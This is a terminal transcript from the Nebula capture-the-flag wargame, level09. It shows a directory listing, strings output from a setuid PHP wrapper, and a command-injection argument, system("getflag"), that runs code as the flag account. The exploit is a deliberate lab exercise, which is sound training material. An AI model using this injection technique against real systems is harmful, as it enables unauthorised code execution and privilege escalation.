```
level09@nebula:/home/flag09$ ls -la
total 13
drwxr-x--- 2 flag09 level09   98 2011-11-20 21:22 .
drwxr-xr-x 1 root   root     140 2012-08-27 07:18 ..
-rw-r--r-- 1 flag09 flag09   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag09 flag09  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag09 level09 7240 2011-11-20 21:22 flag09
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
-rw-r--r-- 1 flag09 flag09   675 2011-05-18 02:54 .profile
level09@nebula:/home/flag09$ strings flag09
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
execve
geteuid
__libc_start_main
GLIBC_2.0
PTRhP
QVhD
D$ #
D$$&
UWVS
[^_]
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
PS1=wibblywobblytimeywimeystuff$
/usr/bin/php
/home/flag09/flag09.php
;*2$"
level09@nebula:/home/flag09$ ./flag09 -r "system(\"getflag\");"
You have successfully executed getflag on a target account

```
